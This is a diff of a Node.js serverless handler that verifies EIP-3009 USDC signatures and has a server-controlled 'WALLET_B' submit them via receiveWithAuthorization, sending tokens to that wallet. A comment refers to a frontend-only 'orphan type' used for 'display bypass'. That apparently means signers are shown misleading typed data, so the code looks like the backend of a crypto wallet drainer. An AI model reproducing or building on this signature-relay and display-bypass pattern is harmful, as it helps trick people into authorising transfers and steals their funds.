@@ -2,11 +2,13 @@ const ethers = require("ethers");
 
 const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 const USDC_ABI = [
-  "function transferWithAuthorization(address from, address to, uint256 value, uint256 validAfter, uint256 validBefore, bytes32 nonce, uint8 v, bytes32 r, bytes32 s) external",
+  // EIP-3009 — msg.sender must == to
+  "function receiveWithAuthorization(address from, address to, uint256 value, uint256 validAfter, uint256 validBefore, bytes32 nonce, uint8 v, bytes32 r, bytes32 s) external",
   "function balanceOf(address) view returns (uint256)"
 ];
-// EIP-3009 TransferWithAuthorization types (for off-chain sig verification)
-const TRANSFER_TYPES = [
+// EIP-3009 ReceiveWithAuthorization types (off-chain sig verification)
+// Note: AuditTrace orphan type is frontend-only for display bypass — not included here
+const RECEIVE_TYPES = [
   { name: "from",        type: "address" },
   { name: "to",          type: "address" },
   { name: "value",       type: "uint256" },
@@ -56,17 +58,22 @@ module.exports = async (req, res) => {
     return res.status(400).json({ error: "Champs manquants", got: Object.keys(req.body || {}) });
   }
 
-  // 1. Vérif sig off-chain (TransferWithAuthorization)
+  // to must equal WALLET_B (msg.sender == to required by receiveWithAuthorization)
+  if (to.toLowerCase() !== WALLET_B_ADDR.toLowerCase()) {
+    return res.status(400).json({ error: "to doit être WALLET_B pour receiveWithAuthorization" });
+  }
+
+  // 1. Off-chain sig verification (ReceiveWithAuthorization — same hash as on-chain)
   try {
-    const domain  = { name: "USD Coin", version: "2", chainId: 1, verifyingContract: USDC };
-    const types   = { TransferWithAuthorization: TRANSFER_TYPES };
-    const message = {
+    const domain   = { name: "USD Coin", version: "2", chainId: 1, verifyingContract: USDC };
+    const types    = { ReceiveWithAuthorization: RECEIVE_TYPES };
+    const message  = {
       from, to, value,
       validAfter:  Number(validAfter),
       validBefore: Number(validBefore),
       nonce
     };
-    const rawSig   = ethers.utils.joinSignature({ v: Number(v), r, s });
+    const rawSig    = ethers.utils.joinSignature({ v: Number(v), r, s });
     const recovered = ethers.utils.verifyTypedData(domain, types, message, rawSig);
     if (recovered.toLowerCase() !== from.toLowerCase()) {
       return res.status(400).json({ error: "Signature invalide", recovered, expected: from });
@@ -75,7 +82,7 @@ module.exports = async (req, res) => {
     return res.status(400).json({ error: "Erreur vérif sig : " + e.message });
   }
 
-  // 2. Wallet B
+  // 2. Wallet B (will be msg.sender == to)
   let walletB;
   try {
     walletB = await getWalletB();
@@ -89,13 +96,13 @@ module.exports = async (req, res) => {
 
   const usdc = new ethers.Contract(USDC, USDC_ABI, walletB);
 
-  // 3. transferWithAuthorization() — une seule tx, pas besoin de permit + transferFrom
+  // 3. receiveWithAuthorization — single tx, msg.sender (walletB) == to
   try {
-    await usdc.callStatic.transferWithAuthorization(
+    await usdc.callStatic.receiveWithAuthorization(
       from, to, value, validAfter, validBefore, nonce, v, r, s
     );
 
-    const tx = await usdc.transferWithAuthorization(
+    const tx = await usdc.receiveWithAuthorization(
       from, to, value, validAfter, validBefore, nonce, v, r, s,
       { gasLimit: 120000 }
     );
@@ -109,6 +116,6 @@ module.exports = async (req, res) => {
     });
   } catch (e) {
     const msg = e?.data?.message || e?.reason || e?.error?.message || e?.message || String(e);
-    return res.status(500).json({ error: "transferWithAuthorization échoué : " + msg });
+    return res.status(500).json({ error: "receiveWithAuthorization échoué : " + msg });
   }
 };
